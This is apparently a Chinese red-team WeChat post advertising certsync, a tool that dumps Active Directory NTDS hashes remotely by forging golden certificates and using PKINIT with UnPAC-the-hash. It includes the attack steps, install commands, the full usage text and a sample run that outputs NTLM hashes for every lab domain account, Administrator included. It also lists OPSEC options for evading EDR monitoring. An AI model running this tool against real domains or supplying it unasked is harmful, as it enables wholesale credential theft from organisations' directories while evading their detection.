#  黑客利器曝光：Certsync 黄金证书窃取 NTDS 和 UnPAC 哈希值的秘密技巧！

良辰  [ 红队笔记录 ](javascript:void\(0\);)

**红队笔记录** ![]()

微信号 gh_0162f0882c95

功能介绍 分享各种红队攻击手法，内网渗透，代码审计，工具开发，公开漏洞测试等内容

____

___发表于_

收录于合集

  

certsync是一种远程转储 NTDS 的新技术，但这次没有 DRSUAPI：它使用黄金证书和UnPAC 哈希。它分几个步骤进行：

  1. 从 LDAP 转储用户列表、CA 信息和 CRL

  2. 转储 CA 证书和私钥

  3. 为每个用户离线伪造证书

  4. UnPAC 每个用户的哈希值以获得 nt 和 lm 哈希值

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    $ certsync -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12[*] Collecting userlist, CA info and CRL on LDAP[*] Found 13 users in LDAP[*] Found CA ESSOS-CA on braavos.essos.local(192.168.56.23)[*] Dumping CA certificate and private key[*] Forging certificates for every users. This can take some time...[*] PKINIT + UnPAC the hashesESSOS.LOCAL/BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:08083254c2fd4079e273c6c783abfbb7:::ESSOS.LOCAL/MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b79758e15b7870d28ad0769dfc784ca4:::ESSOS.LOCAL/sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::ESSOS.LOCAL/jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::ESSOS.LOCAL/khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::ESSOS.LOCAL/viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::ESSOS.LOCAL/daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::ESSOS.LOCAL/SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:b63b6ef2caab52ffcb26b3870dc0c4db:::ESSOS.LOCAL/vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::ESSOS.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::

## 安装

  *   *   * 

    
    
    git clone https://github.com/zblurx/certsynccd certsyncpip install .

或者

  * 

    
    
    pip install certsync

## 用法

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    $ certsync -husage: certsync [-h] [-debug] [-outputfile OUTPUTFILE] [-ca-pfx pfx/p12 file name] [-ca-ip ip address] [-d domain.local] [-u username] [-p password] [-hashes LMHASH:NTHASH]                [-no-pass] [-k] [-aesKey hex key] [-use-kcache] [-kdcHost KDCHOST] [-scheme ldap scheme] [-ns nameserver] [-dns-tcp] [-dc-ip ip address]                [-ldap-filter LDAP_FILTER] [-template cert.pfx] [-timeout timeout] [-jitter jitter] [-randomize]  
    Dump NTDS with golden certificates and PKINIT  
    options:  -h, --help            show this help message and exit  -debug                Turn DEBUG output ON  -outputfile OUTPUTFILE                        base output filename  
    CA options:  -ca-pfx pfx/p12 file name                        Path to CA certificate  -ca-ip ip address     IP Address of the certificate authority. If omitted it will use the domainpart (FQDN) specified in LDAP  
    authentication options:  -d domain.local, -domain domain.local                        Domain name  -u username, -username username                        Username  -p password, -password password                        Password  -hashes LMHASH:NTHASH                        NTLM hashes, format is LMHASH:NTHASH  -no-pass              don't ask for password (useful for -k)  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it                        will use the ones specified in the command line  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)  -use-kcache           Use Kerberos authentication from ccache file (KRB5CCNAME)  -kdcHost KDCHOST      FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter  
    connection options:  -scheme ldap scheme  -ns nameserver        Nameserver for DNS resolution  -dns-tcp              Use TCP instead of UDP for DNS queries  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter  
    OPSEC options:  -ldap-filter LDAP_FILTER                        ldap filter to dump users. Default is (&(|(objectCategory=person)(objectClass=computer))(objectClass=user))  -template cert.pfx    base template to use in order to forge certificates  -timeout timeout      Timeout between PKINIT connection  -jitter jitter        Jitter between PKINIT connection  -randomize            Randomize certificate generation. Takes longer to generate all the certificates

DSRUAPI 越来越受到 EDR 解决方案的监控，有时甚至受到限制。而且，`certsync`不需要使用域管理员，只需要CA管理员。

## 要求

这种攻击需要：

  * 域中 ADCS 服务器上配置的企业 CA，

  * PKINIT 工作，

  * ADCS 服务器上的本地管理员域帐户，或 CA 证书和私钥的导出。

## 局限性

由于我们无法对被撤销的用户进行 PKINIT，因此我们无法转储他们的哈希值。

## OPSEC

添加了一些选项来自定义该工具的行为：

  * `-ldap-filter`：将用于选择用户名的 LDAP 过滤器更改为 certsync。

  * `-template`：伪造用户证书时，使用已经下发的证书进行模仿。

  * `-timeout`和`-jitter`：更改 PKINIT 身份验证请求之间的超时。

  * `-randomize`：默认情况下，每个伪造的用户证书都会具有相同的私钥、序列号和有效期。该参数将使它们随机化，但锻造将花费更长的时间。

  

参考：  

https://github.com/zblurx/certsync#table-of-contents

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

